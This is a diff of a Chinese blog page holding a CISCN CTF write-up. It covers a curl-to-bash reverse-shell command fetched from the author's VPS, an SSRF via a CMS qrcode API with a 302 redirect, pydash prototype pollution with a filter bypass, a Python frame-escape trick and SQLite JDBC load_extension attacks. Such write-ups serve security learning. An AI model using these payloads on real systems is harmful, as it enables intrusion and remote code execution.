@@ -25,7 +25,7 @@
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://example.com/images/favicon.ico">
 <meta property="article:published_time" content="2024-05-20T05:30:13.000Z">
-<meta property="article:modified_time" content="2024-05-20T14:41:13.142Z">
+<meta property="article:modified_time" content="2024-05-20T14:41:47.361Z">
 <meta property="article:author" content="Err0r2333">
 <meta property="article:tag" content="Web">
 <meta name="twitter:card" content="summary">
@@ -195,7 +195,7 @@
             
             <div id="expire-alert" class="alert alert-warning hidden" role="alert">
                 <div class="icon"><i class="fa fa-warning"></i></div>
-                <div class="text"><p>本文最后编辑于 <time datetime="1716216073142"></time> 前，其中的内容可能需要更新。</p></div>
+                <div class="text"><p>本文最后编辑于 <time datetime="1716216107361"></time> 前，其中的内容可能需要更新。</p></div>
             </div>
             
             
@@ -204,7 +204,7 @@
             <div itemprop="articleBody"><p>被CISCN打烂了，几个题都是差一点就出，自己还是太菜了。顺带一提，怎么出题方有srk啊()</p>
 <span id="more"></span>
 <p>私货，不过在misc题里，我赛后才看见</p>
-<img src="/posts/undefined/srkzhenkepa.jpg" class>
+<img src="/posts/26055/srkzhenkepa.jpg" class>
 <span class="blur">prprprprprpr斯哈斯哈老公喜加一</span>
 <hr>
 <h1><span id="第一天"> 第一天</span></h1>
@@ -225,7 +225,7 @@
 <p><a target="_blank" rel="noopener" href="https://lzltool.cn/Tools/IpToDec">https://lzltool.cn/Tools/IpToDec</a></p>
 <p>将自己的vps ip转成十进制</p>
 <p>然后利用curl，在自己的vps上放一个文件，内容如下：</p>
-<img src="/posts/undefined/1.png" class title="awa">
+<img src="/posts/26055/1.png" class title="awa">
 <p>靶机：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=php -r <span class="title function_ invoke__">print_r</span>(`c\url\<span class="variable">$IFS</span>\$<span class="number">9</span><span class="attr">http</span>://自己的十进制ip/ttt|bas\h`);</span><br></pre></td></tr></table></figure>
 <p>python起80端口的http server，监听端口</p>
@@ -236,46 +236,46 @@
 <p>这个题，我还以为qrcode处被修复了，所以就审其它地方去了，没想到没有修复，唉</p>
 <p>扫到flag.php，发现需要本地ip访问。提示给出只需要本地访问即可rce，要打ssrf，搜一下这个cms有没有ssrf的洞先</p>
 <p>查找历史漏洞，发现：</p>
-<img src="/posts/undefined/2.png" class title="awa">
+<img src="/posts/26055/2.png" class title="awa">
 <p>明明上面说被修复了的，为什么实际上还是用这个洞呢</p>
 <p>想了想，哦，他说要开redis服务，那是不是说只修了用ssrf打redis的问题</p>
 <p>看一下最新版的源码逻辑：</p>
 <p>漏洞出现在qrcode，搜索得到：</p>
-<img src="/posts/undefined/3.png" class title="awa">
+<img src="/posts/26055/3.png" class title="awa">
 <p>在Api.php里，我们需要调用这个函数。先看看哪里能调用curl的函数</p>
 <p>其实在dr_catcher_data里</p>
-<img src="/posts/undefined/4.png" class title="awa">
+<img src="/posts/26055/4.png" class title="awa">
 <p>这里就直接可以打ssrf，点进去它的逻辑按道理是可以直接127.0.0.1的</p>
 <p>这里的参数是thumb</p>
 <p>怎么调用呢？</p>
 <p>找到一篇文章里面讲了如何调用api：</p>
 <p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10002?time__1311=mq%2BxBD97qYqCqAKDsD7me5xrOD87KWqWK4D&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F">某cms 前台RCE漏洞分析 - 先知社区</a></p>
 
-<img src="/posts/undefined/6.png" class title="awa">
+<img src="/posts/26055/6.png" class title="awa">
 <p>搜索template，发现就在下面</p>
-<img src="/posts/undefined/7.png" class title="awa">
+<img src="/posts/26055/7.png" class title="awa">
 <p>所以只用这么调用即可：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?s=api&amp;c=api&amp;m=qrcode</span><br></pre></td></tr></table></figure>
-<img src="/posts/undefined/8.png" class title="awa">
+<img src="/posts/26055/8.png" class title="awa">
 <p>很明显要get传入text和thumb</p>
 <p>thumb是我们你ssrf要打的payload，所以text随便传：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?s=api&amp;c=api&amp;m=qrcode&amp;text=<span class="number">1</span>&amp;thumb=http:<span class="comment">//127.0.0.1/flag.php</span></span><br></pre></td></tr></table></figure>
-<img src="/posts/undefined/9.png" class title="awa">
+<img src="/posts/26055/9.png" class title="awa">
 <p>但是ip不正确，不能打127.0.0.1</p>
 <p>换个思路，利用302跳转打内网</p>
 <p>起flask服务：</p>
-<img src="/posts/undefined/10.png" class title="awa">
+<img src="/posts/26055/10.png" class title="awa">
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=curl http:<span class="comment">//vps_ip:port/ttt|bash</span></span><br></pre></td></tr></table></figure>
 <p>python3开启httpserver到port上，打开flask服务，然后将thumb改为我们的http://vps_ip:flask端口上</p>
 <p>然后nc监听另一个端口(需要反弹shell的)</p>
-<img src="/posts/undefined/11.png" class title="awa">
+<img src="/posts/26055/11.png" class title="awa">
 <h2><span id="sanic复现失败等wp"> sanic(复现失败，等wp)</span></h2>
 <p>给了一个sanic框架的python服务，和flask差不多，但是就是换成了sanic</p>
 <p>访问得到<code>/src</code>里有源码：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sanic <span class="keyword">import</span> Sanic</span><br><span class="line"><span class="keyword">from</span> sanic.response <span class="keyword">import</span> text, html</span><br><span class="line"><span class="keyword">from</span> sanic_session <span class="keyword">import</span> Session</span><br><span class="line"><span class="keyword">import</span> pydash</span><br><span class="line"><span class="comment"># pydash==5.1.2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Pollute</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Sanic(__name__)</span><br><span class="line">app.static(<span class="string">&quot;/static/&quot;</span>, <span class="string">&quot;./static/&quot;</span>)</span><br><span class="line">Session(app)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> html(<span class="built_in">open</span>(<span class="string">&#x27;static/index.html&#x27;</span>).read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">request</span>):</span><br><span class="line">    user = request.cookies.get(<span class="string">&quot;user&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> user.lower() == <span class="string">&#x27;adm;n&#x27;</span>:</span><br><span class="line">        request.ctx.session[<span class="string">&#x27;admin&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;login success&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&quot;login fail&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/src&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">src</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> text(<span class="built_in">open</span>(__file__).read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/admin&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">admin</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">if</span> request.ctx.session.get(<span class="string">&#x27;admin&#x27;</span>) == <span class="literal">True</span>:</span><br><span class="line">        key = request.json[<span class="string">&#x27;key&#x27;</span>]</span><br><span class="line">        value = request.json[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> key <span class="keyword">and</span> value <span class="keyword">and</span> <span class="built_in">type</span>(key) <span class="keyword">is</span> <span class="built_in">str</span> <span class="keyword">and</span> <span class="string">&#x27;_.&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> key:</span><br><span class="line">            pollute = Pollute()</span><br><span class="line">            pydash.set_(pollute, key, value)</span><br><span class="line">            <span class="keyword">return</span> text(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> text(<span class="string">&quot;forbidden&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&quot;forbidden&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure>
 <p>特意标注了pydash的版本是5.1.2，估计漏洞和他有关</p>
 <p>这里搜一下pydash 5.1.2的洞</p>
-<img src="/posts/undefined/12.png" class title="awa">
+<img src="/posts/26055/12.png" class title="awa">
 <p>还真有，原型链污染，而且出现在<code>pydash.set</code>上，正好我们这里的<code>admin</code>路由就有</p>
 <p>以下是python原型链污染的一些重点关照对象</p>
 <ul>
@@ -299,7 +299,7 @@
 <p>所以这个问题便解决了</p>
 <p>然后就是怎么个污染，他把<code>_.</code>给过滤了，这里还是师兄nb，用四个反斜杠就绕过去了：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\\\\.</span><br></pre></td></tr></table></figure>
-<img src="/posts/undefined/13.png" class title="awa">
+<img src="/posts/26055/13.png" class title="awa">
 <p>可以看到为true，成功绕过并且触发了pydash的原型链污染</p>
 <p>问题来到如何获取flag。既然rce不了那就只能读文件，先从源码里找能不能得到能够污染的属性</p>
 <p>看源码/src处能够打开file来读，也就是说如果我们能污染<code>__file__</code>，那就能够读任意文件</p>
@@ -307,11 +307,11 @@
 <p>参照pydash+jinja2那篇的payload可以得到获取globals的payload如下</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__init__.__globals__</span><br></pre></td></tr></table></figure>
 <p>获取到<code>__file__</code>，污染成value，以下为污染成功的结果：</p>
-<img src="/posts/undefined/14.png" class title="awa">
+<img src="/posts/26055/14.png" class title="awa">
 <p>那接下来读flag，假如flag在根目录且就叫flag，那这题就结束了</p>
 <p>但是并不是，flag不叫flag。接下来我们还得重新找一个方法读flag</p>
 <p>注意到sanic官方文档有一个app.static：</p>
-<img src="/posts/undefined/15.png" class title="awa">
+<img src="/posts/26055/15.png" class title="awa">
 <p>尝试先污染这个<code>directory_view</code></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__init__\\\\.__globals__\\\\.directory_view</span><br></pre></td></tr></table></figure>
 <p>这样直接污染还不行，说明不是读的globals的</p>
@@ -390,7 +390,7 @@
 </ul>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>():</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">		<span class="keyword">yield</span> g.gi_frame.f_back</span><br><span class="line">    g = f()</span><br><span class="line">    frame = [x <span class="keyword">for</span> x <span class="keyword">in</span> g][<span class="number">0</span>]</span><br><span class="line">    builtin = frame.f_back.f_back.f_back.f_locals[<span class="string">&#x27;__builtins__&#x27;</span>] <span class="comment">#这一步获取builtin就能够获取到一些基本函数，方便我们后续操作</span></span><br><span class="line">    code = frame.f_back.f_back.f_back.f_code</span><br><span class="line">    <span class="built_in">print</span>(code.co_consts)</span><br></pre></td></tr></table></figure>
 <p>测试结果如下：</p>
-<img src="/posts/undefined/16.png" class title="awa">
+<img src="/posts/26055/16.png" class title="awa">
 <p>可以看见我们获取到了<code>THIS_IS_THE_FLAG</code>常量</p>
 <ul>
 <li>flag是变量，通过以下几种方式引入：
@@ -401,7 +401,7 @@
 </li>
 </ul>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>():</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">		<span class="keyword">yield</span> g.gi_frame.f_back</span><br><span class="line">    g = f()</span><br><span class="line">    frame = [x <span class="keyword">for</span> x <span class="keyword">in</span> g][<span class="number">0</span>]</span><br><span class="line">    builtin = frame.f_back.f_back.f_back.f_locals[<span class="string">&#x27;__builtins__&#x27;</span>] <span class="comment">#这一步获取builtin就能够获取到一些基本函数，方便我们后续操作</span></span><br><span class="line">    gl = frame.f_back.f_back.f_back.f_globals</span><br><span class="line">    <span class="built_in">print</span>(gl)</span><br></pre></td></tr></table></figure>
-<img src="/posts/undefined/17.png" class title="awa">
+<img src="/posts/26055/17.png" class title="awa">
 <ul>
 <li>注，可以通过<code>dir()</code>查看某个东西里面的东西，例如<code>dir(__builtins__)</code></li>
 </ul>
@@ -426,17 +426,17 @@
 <p>所以可以通过这样的方式来逐步获取flag的位置：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(code.co_consts[0:x])</span><br></pre></td></tr></table></figure>
 <p>假设第x个输出了runtime什么的，第x-1个正常，那flag就是<code>[x]</code></p>
-<img src="/posts/undefined/18.png" class title="awa">
-<img src="/posts/undefined/19.png" class title="awa">
-<img src="/posts/undefined/20.png" class title="awa">
-<img src="/posts/undefined/21.png" class title="awa">
+<img src="/posts/26055/18.png" class title="awa">
+<img src="/posts/26055/19.png" class title="awa">
+<img src="/posts/26055/20.png" class title="awa">
+<img src="/posts/26055/21.png" class title="awa">
 <p>这下就能确定flag在第12个位置。观察可以通过<code>code.co_const[11:12]</code>得到一个只含有flag的小括号</p>
 <p>用<code>code.co_const[11:12][0]</code>取出，然后慢慢输出flag即可：</p>
-<img src="/posts/undefined/22.png" class title="awa">
-<img src="/posts/undefined/23.png" class title="awa">
+<img src="/posts/26055/22.png" class title="awa">
+<img src="/posts/26055/23.png" class title="awa">
 <p>因为比赛结束环境开不了了，所以只能本地复现了</p>
 <p>如果嫌麻烦可以拿到<code> builtins</code>的str函数把这个tuple变成str：</p>
-<img src="/posts/undefined/24.png" class title="awa">
+<img src="/posts/26055/24.png" class title="awa">
 <h2><span id="ezjava"> ezjava</span></h2>
 <p>哈哈，没想到是jdbc打sqlite，失策了。死磕mysql的后果是目光呆滞</p>
 <p>后续学习jdbc attack的时候再把这几个数据库的打法整理以下</p>
@@ -452,10 +452,10 @@
 <p>IndexController没什么好看的，主要看<code>JdbcController</code>，它传了一个jdbcBean对象进去，然后测试其连通性，其他的bean也没什么有意义的东西，定义了几个类的setter方法和getter方法，只有userBean里有readObject方法，但是jdbc很明显不是打这个userbean的</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.jdbctest.bean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: app.jar:BOOT-INF/classes/com/example/jdbctest/bean/UserBean.class */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserBean</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String age;</span><br><span class="line">    <span class="keyword">private</span> Object obj;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UserBean</span><span class="params">(String name, String age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UserBean</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(String age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getObj</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setObj</span><span class="params">(Object obj)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.obj = obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        ObjectInputStream.<span class="type">GetField</span> <span class="variable">gf</span> <span class="operator">=</span> ois.readFields();</span><br><span class="line">        HashMap&lt;String, <span class="type">byte</span>[]&gt; a = (HashMap) gf.get(<span class="string">&quot;obj&quot;</span>, (Object) <span class="literal">null</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> (String) gf.get(<span class="string">&quot;name&quot;</span>, (Object) <span class="literal">null</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">age</span> <span class="operator">=</span> (String) gf.get(<span class="string">&quot;age&quot;</span>, (Object) <span class="literal">null</span>);</span><br><span class="line">        <span class="keyword">if</span> (a == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="built_in">this</span>.obj = <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            a.put(name, Base64.getDecoder().decode(age));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var7) &#123;</span><br><span class="line">            var7.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>点进<code>this.datasourceServiceImpl.testDatasourceConnectionAble()</code>里，发现了三个sql的测试连接方法：</p>
-<img src="/posts/undefined/25.png" class title="awa">
+<img src="/posts/26055/25.png" class title="awa">
 <p>先说结论，三个数据库我只测了mysql T_T，因为我只学了mysql的打法，然后测试的时候发现index页面会帮你传入这个jdbcBean了，就直接在post包里改url即可</p>
 <p>这是当时测的，mysql能打，但是没有反应，jdbc确实连到我的fake_mysql服务器上了：</p>
-<img src="/posts/undefined/26.png" class title="awa">
+<img src="/posts/26055/26.png" class title="awa">
 <p>然后，然后就没有然后了。打不了反序列化</p>
 <p>pgsql没测，这里放一下y4神写的exp：</p>
 <p>[JavaSec/9.JDBC Attack/PostGreSQL/index.md at main · Y4tacker/JavaSec · GitHub](<a target="_blank" rel="noopener" href="https://github.com/Y4tacker/JavaSec/blob/main/9.JDBC">https://github.com/Y4tacker/JavaSec/blob/main/9.JDBC</a> Attack/PostGreSQL/index.md)</p>
@@ -465,12 +465,12 @@
 <p>还是看看y4神的分析吧：</p>
 <p>[JavaSec/9.JDBC Attack/SQLite/index.md at main · Y4tacker/JavaSec · GitHub](<a target="_blank" rel="noopener" href="https://github.com/Y4tacker/JavaSec/blob/main/9.JDBC">https://github.com/Y4tacker/JavaSec/blob/main/9.JDBC</a> Attack/SQLite/index.md)</p>
 <p>当sqllite建立连接是会调用<code>org.sqlite.core.CoreConnection#open</code></p>
-<img src="/posts/undefined/27.png" class title="awa">
+<img src="/posts/26055/27.png" class title="awa">
 <p>这个时候进extractResource</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> File <span class="title function_">extractResource</span><span class="params">(URL resourceAddr)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">if</span> (resourceAddr.getProtocol().equals(<span class="string">&quot;file&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">File</span>(resourceAddr.toURI());</span><br><span class="line">            &#125; <span class="keyword">catch</span> (URISyntaxException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IOException</span>(e.getMessage());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">File</span> <span class="variable">dbFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="keyword">new</span> <span class="title class_">File</span>(System.getProperty(<span class="string">&quot;java.io.tmpdir&quot;</span>)).getAbsolutePath(), String.format(<span class="string">&quot;sqlite-jdbc-tmp-%d.db&quot;</span>, Integer.valueOf(resourceAddr.hashCode())));</span><br><span class="line">            <span class="keyword">if</span> (dbFile.exists()) &#123;</span><br><span class="line">                <span class="keyword">if</span> (resourceAddr.openConnection().getLastModified() &lt; dbFile.lastModified()) &#123;</span><br><span class="line">                    <span class="keyword">return</span> dbFile;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (!dbFile.delete()) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IOException</span>(<span class="string">&quot;failed to remove existing DB file: &quot;</span> + dbFile.getAbsolutePath());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">8192</span>];</span><br><span class="line">            <span class="type">FileOutputStream</span> <span class="variable">writer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(dbFile);</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">reader</span> <span class="operator">=</span> resourceAddr.openStream();</span><br><span class="line">            <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">int</span> <span class="variable">bytesRead</span> <span class="operator">=</span> reader.read(buffer);</span><br><span class="line">                    <span class="keyword">if</span> (bytesRead == -<span class="number">1</span>) &#123;</span><br><span class="line">                        <span class="keyword">return</span> dbFile;</span><br><span class="line">                    &#125;</span><br><span class="line">                    writer.write(buffer, <span class="number">0</span>, bytesRead);</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    writer.close();</span><br><span class="line">                    reader.close();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <p>简单看看这个流程，能够通过访问这个resourceAddr，然后能够将文件写进定义好的<code>java.io.tmpdir</code>目录，文件名叫<code>sqlite-jdbc-tmp-xxx.db</code>，xxx是resourceAddr的hash值，我们可以通过本地调试测出这个hash值</p>
-<img src="/posts/undefined/28.png" class title="awa">
-<img src="/posts/undefined/29.png" class title="awa">
+<img src="/posts/26055/28.png" class title="awa">
+<img src="/posts/26055/29.png" class title="awa">
 <p>这里的结果只和后面的exp.so有关系，这里改成</p>
 <p>所以说它会把文件缓存进/tmp，但是如果没有允许加载拓展的话，就只能做到这种地步了</p>
 <p>回到这里，看看SqliteDatasourceConnector：</p>
@@ -478,9 +478,9 @@
 <p>可以看到他这里允许加载extension，此时就可以利用 <code>&quot;CREATE VIEW &quot;</code>将不可控的SELECT语句转换为可控。</p>
 <p>如果我们能够控制SELECT语句，我们可以使用<code>SELECT load_extension('/tmp/test.so')</code>来加载<code>dll/so</code>并执行恶意代码</p>
 <p>这里看以下su18师傅的<a target="_blank" rel="noopener" href="https://github.com/su18/JDBC-Attack/blob/main/sqlite-attack/src/main/java/org/su18/jdbc/attack/AttackSQLite.java">攻击示例</a>：</p>
-<img src="/posts/undefined/30.png" class title="awa">
+<img src="/posts/26055/30.png" class title="awa">
 <p>可以看到还需要读一次表，而这个DataSourceConnector里面就有这个操作，而我们只需要写好表名即可</p>
-<img src="/posts/undefined/31.png" class title="awa">
+<img src="/posts/26055/31.png" class title="awa">
 <h3><span id="payload怎么写的"> payload怎么写的</span></h3>
